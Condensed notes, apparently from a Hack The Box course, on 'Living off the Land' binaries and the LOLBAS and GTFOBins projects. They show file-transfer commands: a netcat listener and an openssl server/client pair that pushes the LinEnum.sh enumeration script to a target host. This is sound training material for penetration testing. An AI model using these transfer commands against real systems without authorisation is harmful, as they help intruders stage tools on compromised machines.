The phrase `Living off the land` was coined by Christopher Campbell and Matt Graeber at DerbyCon 3. The shorthand `LOLBins` (`Living off the Land` binaries) came from a Twitter discussion about naming binaries attackers reuse to do more than their original purpose.

Two community projects aggregate these binaries:

- `LOLBAS` Project (Windows)
- `GTFOBins` (Linux)

Common functions abused via `LOLBins`:
...
This section focuses on using `LOLBAS` and `GTFOBins` with practical examples for `download` and `upload` on `Windows` and `Linux` systems.
...
```bash
OathBornX@htb[/htb]$ sudo nc -lvnp 8000
...
```bash
OathBornX@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
...
```bash
OathBornX@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
...
```bash
OathBornX@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
